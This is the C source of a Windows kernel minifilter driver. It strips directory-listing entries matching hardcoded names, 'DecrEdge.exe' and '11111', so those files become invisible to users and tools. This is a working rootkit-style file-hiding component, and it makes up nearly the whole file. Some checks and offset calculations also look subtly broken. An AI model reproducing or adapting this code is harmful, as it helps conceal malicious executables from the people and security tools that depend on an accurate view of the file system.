#include <fltKernel.h>
#include <dontuse.h>
#include <suppress.h>

PFLT_PORT port;
PFLT_PORT ClientPort;
UNICODE_STRING HideFileName;
UNICODE_STRING HideFileName2;
WCHAR FN[255] = { 0 };
PFLT_FILTER FilterHandle = NULL;
NTSTATUS MiniUnload(FLT_FILTER_UNLOAD_FLAGS Flags);
FLT_POSTOP_CALLBACK_STATUS MiniPostCreate(PFLT_CALLBACK_DATA Data, PCFLT_RELATED_OBJECTS FltObjects, PVOID* CompletionContext, FLT_POST_OPERATION_FLAGS Flags);
//FLT_PREOP_CALLBACK_STATUS MiniPreCreate(PFLT_CALLBACK_DATA Data, PCFLT_RELATED_OBJECTS FltObjects, PVOID* CompletionContext);
//FLT_PREOP_CALLBACK_STATUS MiniPreWrite(PFLT_CALLBACK_DATA Data, PCFLT_RELATED_OBJECTS FltObjects, PVOID* CompletionContext);
FLT_POSTOP_CALLBACK_STATUS MiniPostDirControl(PFLT_CALLBACK_DATA Data, PCFLT_RELATED_OBJECTS FltObjects, PVOID* CompletionContext, FLT_POST_OPERATION_FLAGS Flags);

const FLT_OPERATION_REGISTRATION Callbacks[] =
{
	{ IRP_MJ_CREATE,0,NULL,MiniPostCreate },
	{ IRP_MJ_DIRECTORY_CONTROL,0,NULL,MiniPostDirControl },
	{ IRP_MJ_OPERATION_END }
};

const FLT_REGISTRATION FilterRegistration =
{
	sizeof(FLT_REGISTRATION),
	FLT_REGISTRATION_VERSION,
	0,
	NULL,
	Callbacks,
	MiniUnload,
	NULL,
	NULL,
	NULL,
	NULL,
	NULL,
	NULL,
	NULL,
	NULL
};

//NTSTATUS MiniConnect(PFLT_PORT clientport, PVOID serverportcookie, PVOID context, ULONG size, PVOID connectioncookie)
//{
//	ClientPort = clientport;
//	KdPrint(("#DF# port connection\n"));
//	return STATUS_SUCCESS;
//}

//VOID MiniDisconnect(PVOID connectioncookie)
//{
//	KdPrint(("#DF# port disconnection\n"));
//	FltCloseClientPort(FilterHandle, &ClientPort);
//}

NTSTATUS MiniUnload(FLT_FILTER_UNLOAD_FLAGS Flags)
{
	KdPrint(("#DF# Driver Unload \n"));
	FltCloseCommunicationPort(port);
	FltUnregisterFilter(FilterHandle);

	return STATUS_SUCCESS;
}

//NTSTATUS MiniSendRec(PVOID portcookie, PVOID InputBuffer, ULONG InputBufferLength, PVOID OutputBuffer, ULONG OutputBufferLength, PULONG RetLength)
//{
//	PCHAR msg = "minifilter msg!";
//	KdPrint(("#DF# user msg: %ws \n", (PCHAR)InputBuffer));
//
//	strcpy((PCHAR)OutputBuffer, msg);
//
//	wcscpy(FN, InputBuffer);
//
//	RtlInitUnicodeString(&HideFileName, FN);
//
//	KdPrint(("#DF# now hide file: %ws \n", HideFileName.Buffer));
//
//	return STATUS_SUCCESS;
//}

FLT_POSTOP_CALLBACK_STATUS MiniPostDirControl(PFLT_CALLBACK_DATA Data, PCFLT_RELATED_OBJECTS FltObjects, PVOID* CompletionContext, FLT_POST_OPERATION_FLAGS Flags)
{
	//KdPrint(("#DF# DirControl, hiding %ws, addr %p \n", HideFileName.Buffer, HideFileName.Buffer));
	PFILE_DIRECTORY_INFORMATION fileDirInfo, lastFileDirInfo, nextFileDirInfo;
	PFILE_FULL_DIR_INFORMATION fileFullDirInfo, lastFileFullDirInfo, nextFileFullDirInfo;
	PFILE_NAMES_INFORMATION fileNamesInfo, lastFileNamesInfo, nextFileNamesInfo;
	PFILE_BOTH_DIR_INFORMATION fileBothDirInfo, lastFileBothDirInfo, nextFileBothDirInfo;
	PFILE_ID_BOTH_DIR_INFORMATION fileIdBothDirInfo, lastFileIdBothDirInfo, nextFileIdBothDirInfo;
	PFILE_ID_FULL_DIR_INFORMATION fileIdFullDirInfo, lastFileIdFullDirInfo, nextFileIdFullDirInfo;
	UNICODE_STRING fileName;
	ULONG moveLength;

	UNREFERENCED_PARAMETER(Flags);
	UNREFERENCED_PARAMETER(CompletionContext);
	UNREFERENCED_PARAMETER(FltObjects);

	PUNICODE_STRING gHideFileName = &HideFileName;

	//KdPrint(("#DF# file to hide: %ws \n", HideFileName.Buffer));
	//

	if (&HideFileName == NULL)
	{
		//KdPrint(("#DF# HideFile is bad \n"));
		return FLT_POSTOP_FINISHED_PROCESSING;
	}

	if (!NT_SUCCESS(Data->IoStatus.Status))
	{
		//KdPrint(("#DF# Bad IO status \n"));
		return FLT_POSTOP_FINISHED_PROCESSING;
	}

	if (!NT_SUCCESS(Data->IoStatus.Status) ||
		Data->Iopb->MinorFunction != IRP_MN_QUERY_DIRECTORY ||
		Data->Iopb->Parameters.DirectoryControl.QueryDirectory.DirectoryBuffer == NULL ||
		KeGetCurrentIrql() != PASSIVE_LEVEL ||
		FltObjects == 0 ||
		FltObjects->FileObject == 0)
	{
		return FLT_POSTOP_FINISHED_PROCESSING;
	}

	FILE_INFORMATION_CLASS fileInfo;
	fileInfo = Data->Iopb->Parameters.DirectoryControl.QueryDirectory.FileInformationClass;
	if (fileInfo != FileDirectoryInformation &&
		fileInfo != FileFullDirectoryInformation &&
		fileInfo != FileIdFullDirectoryInformation &&
		fileInfo != FileBothDirectoryInformation &&
		fileInfo != FileIdBothDirectoryInformation &&
		fileInfo != FileNamesInformation)
	{
		return FLT_POSTOP_FINISHED_PROCESSING;
	}


	switch (Data->Iopb->Parameters.DirectoryControl.QueryDirectory.FileInformationClass)
	{
	case FileIdBothDirectoryInformation:
		lastFileIdBothDirInfo = NULL;
		fileIdBothDirInfo = (PFILE_ID_BOTH_DIR_INFORMATION)Data->Iopb->Parameters.DirectoryControl.QueryDirectory.DirectoryBuffer;
		for (;;)
		{


			fileName.Buffer = fileIdBothDirInfo->FileName;
			fileName.Length = (USHORT)fileIdBothDirInfo->FileNameLength;
			fileName.MaximumLength = fileName.Length;


			//KdPrint(("#DF# Compare1: %ws or %ws : %ws \n", HideFileName.Buffer, HideFileName2.Buffer, fileName.Buffer));
			//if (FsRtlIsNameInExpression(&HideFileName, &fileName, TRUE, NULL))
			if (wcsstr(fileName.Buffer, HideFileName.Buffer) != NULL || wcsstr(fileName.Buffer, HideFileName2.Buffer) != NULL)
			{
				KdPrint(("#DF# Occurence! FileIdBothDirectoryInformation %ws \n", fileName.Buffer));

				if (lastFileIdBothDirInfo != NULL)
				{
					KdPrint(("#DF# lastFileIdBothDirInfo != NULL \n"));


					if (fileIdBothDirInfo->NextEntryOffset != 0)
					{
						KdPrint(("#DF# fileIdBothDirInfo->NextEntryOffset != 0 \n"));
						lastFileIdBothDirInfo->NextEntryOffset += fileIdBothDirInfo->NextEntryOffset;
					}
					else
					{
						KdPrint(("#DF# else fileIdBothDirInfo->NextEntryOffset != 0 \n"));
						lastFileIdBothDirInfo->NextEntryOffset = 0;
						Data->IoStatus.Status = STATUS_NO_MORE_FILES;
						return FLT_POSTOP_FINISHED_PROCESSING;
					}
				}
				else
				{
					KdPrint(("#DF# else lastFileIdBothDirInfo != NULL \n"));
					if (fileIdBothDirInfo->NextEntryOffset != 0)
					{

						nextFileIdBothDirInfo = (PFILE_ID_BOTH_DIR_INFORMATION)((PUCHAR)fileIdBothDirInfo + fileIdBothDirInfo->NextEntryOffset);
						moveLength = 0;
						while (nextFileIdBothDirInfo->NextEntryOffset != 0)
						{

							moveLength += FIELD_OFFSET(FILE_BOTH_DIR_INFORMATION, FileName) + nextFileIdBothDirInfo->FileNameLength;
							nextFileIdBothDirInfo = (PFILE_ID_BOTH_DIR_INFORMATION)((PUCHAR)nextFileIdBothDirInfo + nextFileIdBothDirInfo->NextEntryOffset);
						}


						moveLength += FIELD_OFFSET(FILE_BOTH_DIR_INFORMATION, FileName) + nextFileIdBothDirInfo->FileNameLength;


						RtlMoveMemory(
							fileIdBothDirInfo,
							(PUCHAR)fileIdBothDirInfo + fileIdBothDirInfo->NextEntryOffset,
							moveLength);
					}
					else
					{
						KdPrint(("#DF# This is the first and last entry, so there's nothing to return \n"));
						//
						// This is the first and last entry, so there's nothing to return
						//
						Data->IoStatus.Status = STATUS_NO_MORE_FILES;
						return FLT_POSTOP_FINISHED_PROCESSING;
					}
				}
			}


			lastFileIdBothDirInfo = fileIdBothDirInfo;
			fileIdBothDirInfo = (PFILE_ID_BOTH_DIR_INFORMATION)((PUCHAR)fileIdBothDirInfo + fileIdBothDirInfo->NextEntryOffset);
			if (lastFileIdBothDirInfo == fileIdBothDirInfo)
			{
				break;
			}
		}
		break;

	case FileDirectoryInformation:
		lastFileDirInfo = NULL;
		fileDirInfo = (PFILE_DIRECTORY_INFORMATION)Data->Iopb->Parameters.DirectoryControl.QueryDirectory.DirectoryBuffer;
		for (;;)
		{
			//
			// Create a unicode string from file name so we can use FsRtl
			//
			fileName.Buffer = fileDirInfo->FileName;
			fileName.Length = (USHORT)fileDirInfo->FileNameLength;
			fileName.MaximumLength = fileName.Length;

			//
			// Check if this is a match on our hide file name
			//
			//KdPrint(("#DF# Compare2: %ws or %ws : %ws \n", HideFileName.Buffer, HideFileName2.Buffer, fileName.Buffer));
			//if (FsRtlIsNameInExpression(&HideFileName, &fileName, TRUE, NULL))
			if (wcsstr(fileName.Buffer, HideFileName.Buffer) != NULL || wcsstr(fileName.Buffer, HideFileName2.Buffer) != NULL)
			{
				KdPrint(("#DF# Occurence! FileDirectoryInformation %ws \n", fileName.Buffer));
				//
				// Skip this entry
				//
				if (lastFileDirInfo != NULL)
				{
					//
					// This is not the first entry
					//
					if (fileDirInfo->NextEntryOffset != 0)
					{
						//
						// Just point the last info's offset to the next info
						//
						lastFileDirInfo->NextEntryOffset += fileDirInfo->NextEntryOffset;
					}
					else
					{
						//
						// This is the last entry
						//
						lastFileDirInfo->NextEntryOffset = 0;
					}
				}
				else
				{
					//
					// This is the first entry
					//
					if (fileDirInfo->NextEntryOffset != 0)
					{
						//
						// Calculate the length of the whole list
						//
						nextFileDirInfo = (PFILE_DIRECTORY_INFORMATION)((PUCHAR)fileDirInfo + fileDirInfo->NextEntryOffset);
						moveLength = 0;
						while (nextFileDirInfo->NextEntryOffset != 0)
						{
							//
							// We use the FIELD_OFFSET macro because FileName is declared as FileName[1] which means that
							// we can't just do sizeof(FILE_DIRECTORY_INFORMATION) + nextFileDirInfo->FileNameLength.
							//
							moveLength += FIELD_OFFSET(FILE_DIRECTORY_INFORMATION, FileName) + nextFileDirInfo->FileNameLength;
							nextFileDirInfo = (PFILE_DIRECTORY_INFORMATION)((PUCHAR)nextFileDirInfo + nextFileDirInfo->NextEntryOffset);
						}

						//
						// Add the final entry
						//
						moveLength += FIELD_OFFSET(FILE_DIRECTORY_INFORMATION, FileName) + nextFileDirInfo->FileNameLength;

						//
						// We need to move everything forward.
						// NOTE: RtlMoveMemory (memove) is required for overlapping ranges like this one.
						//
						RtlMoveMemory(
							fileDirInfo,
							(PUCHAR)fileDirInfo + fileDirInfo->NextEntryOffset,
							moveLength);
					}
					else
					{
						//
						// This is the first and last entry, so there's nothing to return
						//
						Data->IoStatus.Status = STATUS_NO_MORE_FILES;
						return FLT_POSTOP_FINISHED_PROCESSING;
					}
				}
			}

			//
			// Advance to the next directory info
			//
			lastFileDirInfo = fileDirInfo;
			fileDirInfo = (PFILE_DIRECTORY_INFORMATION)((PUCHAR)fileDirInfo + fileDirInfo->NextEntryOffset);
			if (lastFileDirInfo == fileDirInfo)
			{
				break;
			}
		}
		break;

	case FileFullDirectoryInformation:
		lastFileFullDirInfo = NULL;
		fileFullDirInfo = (PFILE_FULL_DIR_INFORMATION)Data->Iopb->Parameters.DirectoryControl.QueryDirectory.DirectoryBuffer;
		for (;;)
		{
			//
			// Create a unicode string from file name so we can use FsRtl
			//
			fileName.Buffer = fileFullDirInfo->FileName;
			fileName.Length = (USHORT)fileFullDirInfo->FileNameLength;
			fileName.MaximumLength = fileName.Length;

			//
			// Check if this is a match on our hide file name
			//
			//if (FsRtlIsNameInExpression(&HideFileName, &fileName, TRUE, NULL))
			//KdPrint(("#DF# Compare3: %ws or %ws : %ws \n", HideFileName.Buffer, HideFileName2.Buffer, fileName.Buffer));
			//if (FsRtlIsNameInExpression(&HideFileName, &fileName, TRUE, NULL))
			if (wcsstr(fileName.Buffer, HideFileName.Buffer) != NULL || wcsstr(fileName.Buffer, HideFileName2.Buffer) != NULL)
			{
				KdPrint(("#DF# Occurence! FileFullDirectoryInformation %ws \n", fileName.Buffer));
				//
				// Skip this entry
				//
				if (lastFileFullDirInfo != NULL)
				{
					//
					// This is not the first entry
					//
					if (fileFullDirInfo->NextEntryOffset != 0)
					{
						//
						// Just point the last info's offset to the next info
						//
						lastFileFullDirInfo->NextEntryOffset += fileFullDirInfo->NextEntryOffset;
					}
					else
					{
						//
						// This is the last entry
						//
						lastFileFullDirInfo->NextEntryOffset = 0;
					}
				}
				else
				{
					//
					// This is the first entry
					//
					if (fileFullDirInfo->NextEntryOffset != 0)
					{
						//
						// Calculate the length of the whole list
						//
						nextFileFullDirInfo = (PFILE_FULL_DIR_INFORMATION)((PUCHAR)fileFullDirInfo + fileFullDirInfo->NextEntryOffset);
						moveLength = 0;
						while (nextFileFullDirInfo->NextEntryOffset != 0)
						{
							//
							// We use the FIELD_OFFSET macro because FileName is declared as FileName[1] which means that
							// we can't just do sizeof(FILE_DIRECTORY_INFORMATION) + nextFileDirInfo->FileNameLength.
							//
							moveLength += FIELD_OFFSET(FILE_FULL_DIR_INFORMATION, FileName) + nextFileFullDirInfo->FileNameLength;
							nextFileFullDirInfo = (PFILE_FULL_DIR_INFORMATION)((PUCHAR)nextFileFullDirInfo + nextFileFullDirInfo->NextEntryOffset);
						}

						//
						// Add the final entry
						//
						moveLength += FIELD_OFFSET(FILE_FULL_DIR_INFORMATION, FileName) + nextFileFullDirInfo->FileNameLength;

						//
						// We need to move everything forward.
						// NOTE: RtlMoveMemory (memove) is required for overlapping ranges like this one.
						//
						RtlMoveMemory(
							fileFullDirInfo,
							(PUCHAR)fileFullDirInfo + fileFullDirInfo->NextEntryOffset,
							moveLength);
					}
					else
					{
						//
						// This is the first and last entry, so there's nothing to return
						//
						Data->IoStatus.Status = STATUS_NO_MORE_FILES;
						return FLT_POSTOP_FINISHED_PROCESSING;
					}
				}
			}

			//
			// Advance to the next directory info
			//
			lastFileFullDirInfo = fileFullDirInfo;
			fileFullDirInfo = (PFILE_FULL_DIR_INFORMATION)((PUCHAR)fileFullDirInfo + fileFullDirInfo->NextEntryOffset);
			if (lastFileFullDirInfo == fileFullDirInfo)
			{
				break;
			}
		}
		break;

	case FileNamesInformation:
		lastFileNamesInfo = NULL;
		fileNamesInfo = (PFILE_NAMES_INFORMATION)Data->Iopb->Parameters.DirectoryControl.QueryDirectory.DirectoryBuffer;
		for (;;)
		{
			//
			// Create a unicode string from file name so we can use FsRtl
			//
			fileName.Buffer = fileNamesInfo->FileName;
			fileName.Length = (USHORT)fileNamesInfo->FileNameLength;
			fileName.MaximumLength = fileName.Length;

			//
			// Check if this is a match on our hide file name
			//
			//if (FsRtlIsNameInExpression(&HideFileName, &fileName, TRUE, NULL))
			//KdPrint(("#DF# Compare4: %ws or %ws : %ws \n", HideFileName.Buffer, HideFileName2.Buffer, fileName.Buffer));
			//if (FsRtlIsNameInExpression(&HideFileName, &fileName, TRUE, NULL))
			if (wcsstr(fileName.Buffer, HideFileName.Buffer) != NULL || wcsstr(fileName.Buffer, HideFileName2.Buffer) != NULL)
			{
				KdPrint(("#DF# Occurence! FileNamesInformation %ws \n", fileName.Buffer));
				//
				// Skip this entry
				//
				if (lastFileNamesInfo != NULL)
				{
					//
					// This is not the first entry
					//
					if (fileNamesInfo->NextEntryOffset != 0)
					{
						//
						// Just point the last info's offset to the next info
						//
						lastFileNamesInfo->NextEntryOffset += fileNamesInfo->NextEntryOffset;
					}
					else
					{
						//
						// This is the last entry
						//
						lastFileNamesInfo->NextEntryOffset = 0;
					}
				}
				else
				{
					//
					// This is the first entry
					//
					if (fileNamesInfo->NextEntryOffset != 0)
					{
						//
						// Calculate the length of the whole list
						//
						nextFileNamesInfo = (PFILE_NAMES_INFORMATION)((PUCHAR)fileNamesInfo + fileNamesInfo->NextEntryOffset);
						moveLength = 0;
						while (nextFileNamesInfo->NextEntryOffset != 0)
						{
							//
							// We use the FIELD_OFFSET macro because FileName is declared as FileName[1] which means that
							// we can't just do sizeof(FILE_DIRECTORY_INFORMATION) + nextFileDirInfo->FileNameLength.
							//
							moveLength += FIELD_OFFSET(FILE_NAMES_INFORMATION, FileName) + nextFileNamesInfo->FileNameLength;
							nextFileNamesInfo = (PFILE_NAMES_INFORMATION)((PUCHAR)nextFileNamesInfo + nextFileNamesInfo->NextEntryOffset);
						}

						//
						// Add the final entry
						//
						moveLength += FIELD_OFFSET(FILE_NAMES_INFORMATION, FileName) + nextFileNamesInfo->FileNameLength;

						//
						// We need to move everything forward.
						// NOTE: RtlMoveMemory (memove) is required for overlapping ranges like this one.
						//
						RtlMoveMemory(
							fileNamesInfo,
							(PUCHAR)fileNamesInfo + fileNamesInfo->NextEntryOffset,
							moveLength);
					}
					else
					{
						//
						// This is the first and last entry, so there's nothing to return
						//
						Data->IoStatus.Status = STATUS_NO_MORE_FILES;
						return FLT_POSTOP_FINISHED_PROCESSING;
					}
				}
			}

			//
			// Advance to the next directory info
			//
			lastFileNamesInfo = fileNamesInfo;
			fileNamesInfo = (PFILE_NAMES_INFORMATION)((PUCHAR)fileNamesInfo + fileNamesInfo->NextEntryOffset);
			if (lastFileNamesInfo == fileNamesInfo)
			{
				break;
			}
		}
		break;

	case FileBothDirectoryInformation:
		lastFileBothDirInfo = NULL;
		fileBothDirInfo = (PFILE_BOTH_DIR_INFORMATION)Data->Iopb->Parameters.DirectoryControl.QueryDirectory.DirectoryBuffer;
		for (;;)
		{

			//
			// Create a unicode string from file name so we can use FsRtl
			//
			fileName.Buffer = fileBothDirInfo->FileName;
			fileName.Length = (USHORT)fileBothDirInfo->FileNameLength;
			fileName.MaximumLength = fileName.Length;

			//
			// Check if this is a match on our hide file name
			//
			//if (FsRtlIsNameInExpression(&HideFileName, &fileName, TRUE, NULL))
			//KdPrint(("#DF# Compare5: %ws or %ws : %ws \n", HideFileName.Buffer, HideFileName2.Buffer, fileName.Buffer));
			//if (FsRtlIsNameInExpression(&HideFileName, &fileName, TRUE, NULL))
			if (wcsstr(fileName.Buffer, HideFileName.Buffer) != NULL || wcsstr(fileName.Buffer, HideFileName2.Buffer) != NULL)
			{
				KdPrint(("#DF# Occurence! FileBothDirectoryInformation %ws \n", fileName.Buffer));
				//
				// Skip this entry
				//
				if (lastFileBothDirInfo != NULL)
				{
					//
					// This is not the first entry
					//
					if (fileBothDirInfo->NextEntryOffset != 0)
					{
						//
						// Just point the last info's offset to the next info
						//
						lastFileBothDirInfo->NextEntryOffset += fileBothDirInfo->NextEntryOffset;
					}
					else
					{
						//
						// This is the last entry
						//
						lastFileBothDirInfo->NextEntryOffset = 0;
					}
				}
				else
				{
					//
					// This is the first entry
					//
					if (fileBothDirInfo->NextEntryOffset != 0)
					{
						//
						// Calculate the length of the whole list
						//
						nextFileBothDirInfo = (PFILE_BOTH_DIR_INFORMATION)((PUCHAR)fileBothDirInfo + fileBothDirInfo->NextEntryOffset);
						moveLength = 0;
						while (nextFileBothDirInfo->NextEntryOffset != 0)
						{
							//
							// We use the FIELD_OFFSET macro because FileName is declared as FileName[1] which means that
							// we can't just do sizeof(FILE_DIRECTORY_INFORMATION) + nextFileDirInfo->FileNameLength.
							//
							moveLength += FIELD_OFFSET(FILE_BOTH_DIR_INFORMATION, FileName) + nextFileBothDirInfo->FileNameLength;
							nextFileBothDirInfo = (PFILE_BOTH_DIR_INFORMATION)((PUCHAR)nextFileBothDirInfo + nextFileBothDirInfo->NextEntryOffset);
						}

						//
						// Add the final entry
						//
						moveLength += FIELD_OFFSET(FILE_BOTH_DIR_INFORMATION, FileName) + nextFileBothDirInfo->FileNameLength;

						//
						// We need to move everything forward.
						// NOTE: RtlMoveMemory (memove) is required for overlapping ranges like this one.
						//
						RtlMoveMemory(
							fileBothDirInfo,
							(PUCHAR)fileBothDirInfo + fileBothDirInfo->NextEntryOffset,
							moveLength);
					}
					else
					{
						//
						// This is the first and last entry, so there's nothing to return
						//
						Data->IoStatus.Status = STATUS_NO_MORE_FILES;
						return FLT_POSTOP_FINISHED_PROCESSING;
					}
				}
			}

			//
			// Advance to the next directory info
			//
			lastFileBothDirInfo = fileBothDirInfo;
			fileBothDirInfo = (PFILE_BOTH_DIR_INFORMATION)((PUCHAR)fileBothDirInfo + fileBothDirInfo->NextEntryOffset);
			if (lastFileBothDirInfo == fileBothDirInfo)
			{
				break;
			}
		}
		break;


	case FileIdFullDirectoryInformation:
		lastFileIdFullDirInfo = NULL;
		fileIdFullDirInfo = (PFILE_ID_FULL_DIR_INFORMATION)Data->Iopb->Parameters.DirectoryControl.QueryDirectory.DirectoryBuffer;
		for (;;)
		{

			fileName.Buffer = fileIdFullDirInfo->FileName;
			fileName.Length = (USHORT)fileIdFullDirInfo->FileNameLength;
			fileName.MaximumLength = fileName.Length;

			//KdPrint(("#DF# Compare6: %ws or %ws : %ws \n", HideFileName.Buffer, HideFileName2.Buffer, fileName.Buffer));
			//if (FsRtlIsNameInExpression(&HideFileName, &fileName, TRUE, NULL))
			if (wcsstr(fileName.Buffer, HideFileName.Buffer) != NULL || wcsstr(fileName.Buffer, HideFileName2.Buffer) != NULL)
			{
				KdPrint(("#DF# Occurence! FileIdFullDirectoryInformation %ws \n", fileName.Buffer));

				if (lastFileIdFullDirInfo != NULL)
				{

					if (fileIdFullDirInfo->NextEntryOffset != 0)
					{

						lastFileIdFullDirInfo->NextEntryOffset += fileIdFullDirInfo->NextEntryOffset;
					}
					else
					{
						lastFileIdFullDirInfo->NextEntryOffset = 0;
					}
				}
				else
				{

					if (fileIdFullDirInfo->NextEntryOffset != 0)
					{

						nextFileIdFullDirInfo = (PFILE_ID_FULL_DIR_INFORMATION)((PUCHAR)fileIdFullDirInfo + fileIdFullDirInfo->NextEntryOffset);
						moveLength = 0;
						while (nextFileIdFullDirInfo->NextEntryOffset != 0)
						{

							moveLength += FIELD_OFFSET(FILE_ID_FULL_DIR_INFORMATION, FileName) + nextFileIdFullDirInfo->FileNameLength;
							nextFileIdFullDirInfo = (PFILE_ID_FULL_DIR_INFORMATION)((PUCHAR)nextFileIdFullDirInfo + nextFileIdFullDirInfo->NextEntryOffset);
						}


						moveLength += FIELD_OFFSET(FILE_ID_FULL_DIR_INFORMATION, FileName) + nextFileIdFullDirInfo->FileNameLength;


						RtlMoveMemory(
							fileIdFullDirInfo,
							(PUCHAR)fileIdFullDirInfo + fileIdFullDirInfo->NextEntryOffset,
							moveLength);
					}
					else
					{

						Data->IoStatus.Status = STATUS_NO_MORE_FILES;
						return FLT_POSTOP_FINISHED_PROCESSING;
					}
				}
			}


			lastFileIdFullDirInfo = fileIdFullDirInfo;
			fileIdFullDirInfo = (PFILE_ID_FULL_DIR_INFORMATION)((PUCHAR)fileIdFullDirInfo + fileIdFullDirInfo->NextEntryOffset);
			if (lastFileIdFullDirInfo == fileIdFullDirInfo)
			{
				break;
			}
		}
		break;

	default:

		NT_ASSERT(FALSE);
		return FLT_POSTOP_FINISHED_PROCESSING;
	}


	return FLT_POSTOP_FINISHED_PROCESSING;
}

FLT_POSTOP_CALLBACK_STATUS MiniPostCreate(PFLT_CALLBACK_DATA Data, PCFLT_RELATED_OBJECTS FltObjects, PVOID* CompletionContext, FLT_POST_OPERATION_FLAGS Flags)
{
	//KdPrint(("#DF# post-create runs \n"));
	return FLT_POSTOP_FINISHED_PROCESSING;
}

FLT_PREOP_CALLBACK_STATUS MiniPreCreate(PFLT_CALLBACK_DATA Data, PCFLT_RELATED_OBJECTS FltObjects, PVOID* CompletionContext)
{
	PFLT_FILE_NAME_INFORMATION FileNameInfo;
	NTSTATUS status;
	WCHAR Name[256] = { 0 };

	status = FltGetFileNameInformation(Data, FLT_FILE_NAME_NORMALIZED | FLT_FILE_NAME_QUERY_DEFAULT, &FileNameInfo);

	if (NT_SUCCESS(status))
	{
		status = FltParseFileNameInformation(FileNameInfo);

		if (NT_SUCCESS(status))
		{
			if (FileNameInfo->Name.MaximumLength < 255)
			{
				//RtlCopyMemory(Name, FileNameInfo->Name.Buffer, FileNameInfo->Name.MaximumLength);
				//KdPrint(("#DF# create file %ws \n", Name));
			}
		}

		FltReleaseFileNameInformation(FileNameInfo);
	}
	return FLT_PREOP_SUCCESS_WITH_CALLBACK;
}

//FLT_PREOP_CALLBACK_STATUS MiniPreWrite(PFLT_CALLBACK_DATA Data, PCFLT_RELATED_OBJECTS FltObjects, PVOID* CompletionContext)
//{
//	PFLT_FILE_NAME_INFORMATION FileNameInfo;
//	NTSTATUS status;
//	WCHAR Name[256] = { 0 };
//
//	status = FltGetFileNameInformation(Data, FLT_FILE_NAME_NORMALIZED | FLT_FILE_NAME_QUERY_DEFAULT, &FileNameInfo);
//
//	if (NT_SUCCESS(status))
//	{
//		status = FltParseFileNameInformation(FileNameInfo);
//
//		if (NT_SUCCESS(status))
//		{
//			if (FileNameInfo->Name.MaximumLength < 255)
//			{
//				RtlCopyMemory(Name, FileNameInfo->Name.Buffer, FileNameInfo->Name.MaximumLength);
//
//				_wcsupr(Name);
//				KdPrint(("#DF# PreWrite : %ws \n", Name));
//				if (wcsstr(Name, L"THISFILE.TXT") != NULL)
//				{
//					KdPrint(("#DF# %ws access!!!\n", Name));
//					Data->IoStatus.Status = STATUS_INVALID_PARAMETER;
//					Data->IoStatus.Information = 0;
//					FltReleaseFileNameInformation(FileNameInfo);
//					return FLT_PREOP_COMPLETE;
//				}
//
//				//KdPrint(("#DF# create file %ws \n", Name));
//			}
//		}
//
//		FltReleaseFileNameInformation(FileNameInfo);
//	}
//	return FLT_PREOP_SUCCESS_NO_CALLBACK;
//}

NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath)
{
	KdPrint(("#DF# Driver init\n"));
	NTSTATUS status;
	PSECURITY_DESCRIPTOR sd;
	OBJECT_ATTRIBUTES oa = { 0 };
	UNICODE_STRING name = RTL_CONSTANT_STRING(L"\\mf");


	/*FILE * hfile = fopen("hidefiles.txt", "r");
	WCHAR fname[255] = { 0 };
	fread(fname, sizeof(WCHAR), 255, hfile);
	fclose(hfile);*/
	RtlInitUnicodeString(&HideFileName, L"DecrEdge.exe");
	RtlInitUnicodeString(&HideFileName2, L"11111");
	KdPrint(("#DF# file %ws will be hidden \n", HideFileName.Buffer));
	//return 0;

	status = FltRegisterFilter(DriverObject, &FilterRegistration, &FilterHandle);

	if (NT_SUCCESS(status))
	{
		KdPrint(("#DF# Registration ok\n"));
		status = FltBuildDefaultSecurityDescriptor(&sd, FLT_PORT_ALL_ACCESS);
		if (!NT_SUCCESS(status))
		{
			KdPrint(("#DF# Something wrong!\n"));
			FltUnregisterFilter(FilterHandle);
		}
		KdPrint(("#DF# Security descriptor ok\n"));
		InitializeObjectAttributes(&oa, &name, OBJ_KERNEL_HANDLE | OBJ_CASE_INSENSITIVE, NULL, sd);

		//status = FltCreateCommunicationPort(FilterHandle, &port, &oa, NULL, MiniConnect, MiniDisconnect, MiniSendRec, 1);
		//status = FltCreateCommunicationPort(FilterHandle, &port, &oa, NULL, MiniConnect, MiniDisconnect, NULL, 1);
		//if (!NT_SUCCESS(status))
		//{
		//	KdPrint(("#DF# Something wrong!\n"));
		//	FltUnregisterFilter(FilterHandle);
		//}
		FltFreeSecurityDescriptor(sd);


		status = FltStartFiltering(FilterHandle);
		KdPrint(("#DF# start..\n"));
		if (!NT_SUCCESS(status))
		{
			KdPrint(("#DF# Something wrong!\n"));
			FltUnregisterFilter(FilterHandle);
		}
	}
	return status;
}